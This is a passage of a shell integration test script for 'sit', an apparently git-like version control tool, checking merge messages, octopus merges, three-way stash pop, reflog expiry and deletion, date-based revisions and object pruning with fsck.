assert_eq "$ORC" "0" "35b: an octopus with -S and -m merges"
assert_eq "$("$SIT" cat-file HEAD | grep -c '^parent')" "3" "35b: as an octopus (three parents)"
assert_eq "$(subj)" "Octo" "35b: under -m's message"
assert_contains "$("$SIT" verify-commit 2>&1)" "good signature" "35b: and signed"
printf 'a\nMAIN\nc\n' > f.txt; c f.txt; "$SIT" commit -m m2 >/dev/null
"$SIT" merge c1 -m "Resolve c1" >/dev/null 2>&1
assert_eq "$(cat .sit/MERGE_MSG 2>/dev/null)" "Resolve c1" "35c: a conflict stop saves the message"
printf 'a\nBOTH\nc\n' > f.txt; c f.txt; "$SIT" commit >/dev/null 2>&1; CRC=$?
assert_eq "$CRC" "0" "35c: and a bare 'sit commit' resolves with it"
assert_eq "$(subj)" "Resolve c1" "35c: as the merge commit's message"
assert_eq "$("$SIT" cat-file HEAD | grep -c '^parent')" "2" "35c: with both parents"
[ -e .sit/MERGE_MSG ] && bad "35c: the commit left MERGE_MSG" || ok
"$SIT" checkout -b c2 HEAD~1 >/dev/null 2>&1 || "$SIT" checkout -b c2 >/dev/null 2>&1
printf 'a\nC2\nc\n' > f.txt; c f.txt; "$SIT" commit -m c2 >/dev/null; "$SIT" checkout main >/dev/null
printf 'a\nM3\nc\n' > f.txt; c f.txt; "$SIT" commit -m m3 >/dev/null
"$SIT" merge -m x c2 >/dev/null 2>&1; "$SIT" merge --abort >/dev/null 2>&1
[ -e .sit/MERGE_MSG ] && bad "35d: merge --abort left MERGE_MSG" || ok
"$SIT" merge -m y c2 >/dev/null 2>&1; "$SIT" reset --hard HEAD >/dev/null 2>&1
[ -e .sit/MERGE_MSG ] && bad "35d: reset --hard left MERGE_MSG" || ok
"$SIT" commit >/dev/null 2>&1; assert_eq "$?" "1" "35e: a bare commit with no merge in progress still needs a message"
"$SIT" merge c2 -m >/dev/null 2>&1; assert_eq "$?" "1" "35e: -m without a message is refused"
"$SIT" checkout -b d1 >/dev/null; echo d > d.txt; c d.txt; "$SIT" commit -m d1 >/dev/null
"$SIT" checkout main >/dev/null; echo e > e.txt; c e.txt; "$SIT" commit -m e >/dev/null
"$SIT" merge d1 >/dev/null 2>&1
assert_eq "$(subj)" "Merge branch 'd1'" "35f: without -m the default message is unchanged"

# ── 36. 1.8.0 three-way `stash pop` ──────────────────────────────────
# Through 1.7.x pop refused once HEAD had moved past the stash's base. It now
# applies the stash's change (base → snapshot) onto HEAD without committing,
# and keeps the stash on a conflict or a refusal.
hr "1.8.0 three-way stash pop"
R="$WORK/sp180"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'a1\na2\na3\n' > a.txt; echo b > b.txt; echo gone > d.txt
c a.txt; c b.txt; c d.txt; "$SIT" commit -m base >/dev/null
printf 'a1\nSTASHED\na3\n' > a.txt; c a.txt; echo new > n.txt; c n.txt; "$SIT" rm d.txt >/dev/null
"$SIT" stash >/dev/null
echo b2 > b.txt; c b.txt; "$SIT" commit -m "move head" >/dev/null
"$SIT" stash pop >/dev/null 2>&1; assert_eq "$?" "0" "36a: pop onto a moved HEAD applies cleanly"
assert_eq "$(sed -n 2p a.txt)" "STASHED" "36a: the stash's edit lands"
assert_eq "$(cat b.txt)" "b2" "36a: HEAD's later change stays"
assert_eq "$(cat n.txt 2>/dev/null)" "new" "36a: a file the stash added arrives"
[ -e d.txt ] && bad "36a: a file the stash deleted is still there" || ok
assert_eq "$("$SIT" stash list)" "no stash entries" "36a: and the entry is popped"
"$SIT" commit -m "apply" >/dev/null
printf 'a1\nMINE\na3\n' > a.txt; c a.txt; "$SIT" stash >/dev/null
printf 'a1\nTHEIRS\na3\n' > a.txt; c a.txt; "$SIT" commit -m "conflicting" >/dev/null
"$SIT" stash pop >/dev/null 2>&1; assert_eq "$?" "1" "36b: a conflicting pop stops"
assert_contains "$(cat a.txt)" "<<<<<<<" "36b: with conflict markers"
assert_contains "$("$SIT" stash list)" "stash@{0}" "36b: and keeps the stash"
"$SIT" commit -m x >/dev/null 2>&1; assert_eq "$?" "1" "36b: a commit refuses the unresolved file"
printf 'a1\nBOTH\na3\n' > a.txt; c a.txt; "$SIT" commit -m resolved >/dev/null
"$SIT" stash drop >/dev/null
printf 'a1\nS3\na3\n' > a.txt; c a.txt; "$SIT" stash >/dev/null
echo b3 > b.txt; c b.txt; "$SIT" commit -m mv3 >/dev/null; echo dirty >> b.txt
"$SIT" stash pop >/dev/null 2>&1; assert_eq "$?" "1" "36c: a dirty tree refuses the pop"
assert_eq "$(tail -1 b.txt)" "dirty" "36c: the uncommitted edit is intact"
"$SIT" reset --hard HEAD >/dev/null; "$SIT" stash drop >/dev/null
echo new > q.txt; c q.txt; "$SIT" stash >/dev/null
echo b4 > b.txt; c b.txt; "$SIT" commit -m mv4 >/dev/null; echo precious > q.txt
"$SIT" stash pop >/dev/null 2>&1; assert_eq "$?" "1" "36d: an untracked file in the way refuses"
assert_eq "$(cat q.txt)" "precious" "36d: and is not overwritten"
assert_contains "$("$SIT" stash list)" "stash@{0}" "36d: the stash is kept"

# ── 37. 1.8.0 reflog expire / delete / @{<date>} ─────────────────────
# Reflogs never expired, so `fsck --prune` could reclaim reflog-protected
# objects only with --prune-now; and --prune dated only commits, so a discarded
# old commit's trees and blobs stayed dangling for ever.
hr "1.8.0 reflog expire, delete and @{<date>}"
if command -v python3 >/dev/null 2>&1; then
  R="$WORK/rl180"; mkdir -p "$R"; cd "$R"
  "$SIT" init >/dev/null
  for i in 1 2 3; do echo $i > f.txt; c f.txt; "$SIT" commit -m c$i >/dev/null; done
  python3 -I -c '
import re
p = ".sit/logs/HEAD"; L = open(p).read().splitlines()
ts = [1767225600, 1769904000, 1772323200]          # 2026-01-01, -02-01, -03-01 UTC
open(p, "w").write("\n".join(re.sub(r"> \d+ \+0000\t", "> %d +0000\t" % t, l) for l, t in zip(L, ts)) + "\n")'
  sel() { "$SIT" log --oneline "$1" 2>/dev/null | head -1 | cut -d' ' -f2; }
  assert_eq "$(sel 'HEAD@{2026-01-15}')" "c1" "37a: @{<date>} is the value at that date"
  assert_eq "$(sel 'HEAD@{2026-02-01}')" "c2" "37a: an entry made exactly then counts"
  assert_eq "$(sel 'HEAD@{2026-02-01 00:00:00}')" "c2" "37a: date and time"
  assert_eq "$(sel 'HEAD@{2026-05-01}')" "c3" "37a: after the last entry, the current value"
  assert_eq "$(sel 'HEAD@{1.week.ago}')" "c3" "37a: relative (dotted)"
  assert_eq "$(sel 'HEAD@{3 months ago}')" "c3" "37a: relative (spaced)"
  assert_eq "$(sel 'HEAD@{2025-01-01}')" "c1" "37a: before the log, its oldest entry (git's fallback)"
  "$SIT" log --oneline 'HEAD@{bogus}' >/dev/null 2>&1; assert_eq "$?" "1" "37a: an unreadable time is not a revision"
  "$SIT" reflog expire --expire=2026-02-15 HEAD >/dev/null
  assert_eq "$("$SIT" reflog | wc -l | tr -d ' ')" "1" "37b: expire drops the entries before the cutoff"
  assert_contains "$("$SIT" reflog)" "c3" "37b: and keeps the later one"
  "$SIT" reflog delete 'HEAD@{0}' >/dev/null
  assert_eq "$("$SIT" reflog | wc -l | tr -d ' ')" "0" "37c: delete removes one entry"
  "$SIT" reflog delete 'HEAD@{5}' >/dev/null 2>&1; assert_eq "$?" "1" "37c: past the end is refused"
  "$SIT" reflog expire >/dev/null 2>&1; assert_eq "$?" "1" "37d: expire needs --all or a ref"
  "$SIT" reflog expire --expire=whenever --all >/dev/null 2>&1; assert_eq "$?" "1" "37d: and a time it can read"
  "$SIT" reflog expire --expire=never --all >/dev/null 2>&1; assert_eq "$?" "0" "37d: never keeps everything"
  assert_contains "$("$SIT" reflog show main)" "main@{0}" "37d: reflog show is the listing"

  # 37e: after expiry, --prune takes an old discarded commit AND what only it held.
  R="$WORK/rl180p"; mkdir -p "$R"; cd "$R"
  "$SIT" init >/dev/null; echo base > base.txt; c base.txt; "$SIT" commit -m base >/dev/null
  P=$(tr -d '\n' < .sit/refs/heads/main)
  echo "recent work" > r.txt; c r.txt; "$SIT" commit -m recent >/dev/null
  RC=$(tr -d '\n' < .sit/refs/heads/main); RT=$("$SIT" cat-file "$RC" | awk '/^tree /{print $2}')
  RB=$("$SIT" cat-file "$RT" | python3 -I -c 'import sys;t=sys.stdin.buffer.read();i=t.index(b"r.txt\0")+6;print(t[i:i+32].hex())')
  "$SIT" reset --hard "$P" >/dev/null
  read -r OC OT UB <<< "$(python3 -I "$ROOT/tests/integration/plant_old_commit.py" "$P" "$RB")"
  "$SIT" fsck --prune >/dev/null 2>&1
  "$SIT" cat-file "$RC" >/dev/null 2>&1; assert_eq "$?" "0" "37e: a reflog-protected recent commit survives --prune"
  "$SIT" reflog expire --expire=now --all >/dev/null
  rm -rf .sit/logs
  "$SIT" fsck --prune >/dev/null 2>&1
  "$SIT" cat-file "$OC" >/dev/null 2>&1; assert_eq "$?" "1" "37e: the old discarded commit is pruned"
  "$SIT" cat-file "$UB" >/dev/null 2>&1; assert_eq "$?" "1" "37e: with the blob only it held (1.7.x kept it)"
  "$SIT" cat-file "$OT" >/dev/null 2>&1; assert_eq "$?" "1" "37e: and its tree"
  "$SIT" cat-file "$RC" >/dev/null 2>&1; assert_eq "$?" "0" "37e: the recent dangling commit is within grace"
  "$SIT" cat-file "$RB" >/dev/null 2>&1; assert_eq "$?" "0" "37e: and so is the blob it shares with the old one"
  "$SIT" cat-file "$P" >/dev/null 2>&1; assert_eq "$?" "0" "37e: live history is untouched"
  assert_contains "$("$SIT" fsck)" "0 bad" "37e: fsck is clean after"
else
  echo "  (skipped 37: python3 not available)"
fi

# ── summary ────────────────────────────────────────────────────────
printf '\n=== integration: %d passed, %d failed ===\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ] || exit 1
